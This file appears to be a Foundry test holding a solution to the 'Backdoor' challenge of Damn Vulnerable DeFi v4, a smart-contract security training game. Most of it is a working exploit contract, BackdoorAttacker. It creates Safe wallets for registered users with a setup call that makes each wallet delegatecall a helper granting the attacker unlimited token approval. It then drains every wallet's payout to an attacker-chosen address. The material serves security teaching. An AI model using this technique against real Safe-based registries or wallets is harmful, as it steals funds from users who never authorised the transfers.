// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract ApprovalHelper {
    DamnValuableToken private immutable token;
    address private immutable spender;

    constructor(DamnValuableToken _token, address _spender) {
        token = _token;
        spender = _spender;
    }

    function approveSpender() external {
        token.approve(spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    uint256 private constant PAYMENT_AMOUNT = 10e18;

    DamnValuableToken private immutable token;
    SafeProxyFactory private immutable walletFactory;
    WalletRegistry private immutable walletRegistry;
    Safe private immutable singletonCopy;
    address private immutable recovery;
    address[] private users;
    ApprovalHelper private immutable helper;

    constructor(
        DamnValuableToken _token,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        Safe _singletonCopy,
        address[] memory _users,
        address _recovery
    ) {
        token = _token;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        singletonCopy = _singletonCopy;
        recovery = _recovery;
        users = _users;
        helper = new ApprovalHelper(_token, address(this));
    }

    function attack() external {
        for (uint256 i = 0; i < users.length; i++) {
            address owner = users[i];
            address[] memory owners = new address[](1);
            owners[0] = owner;

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                owners,
                uint256(1),
                address(helper),
                abi.encodeWithSelector(ApprovalHelper.approveSpender.selector),
                address(0),
                address(0),
                uint256(0),
                payable(address(0))
            );

            walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                uint256(uint160(owner)),
                walletRegistry
            );

            address wallet = walletRegistry.wallets(owner);
            token.transferFrom(wallet, recovery, PAYMENT_AMOUNT);
        }
    }
}

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;
    BackdoorAttacker attacker;

    modifier checkSolvedByPlayer() {
        vm.broadcast(player);
        _;
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        attacker = new BackdoorAttacker(token, walletFactory, walletRegistry, singletonCopy, users, recovery);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
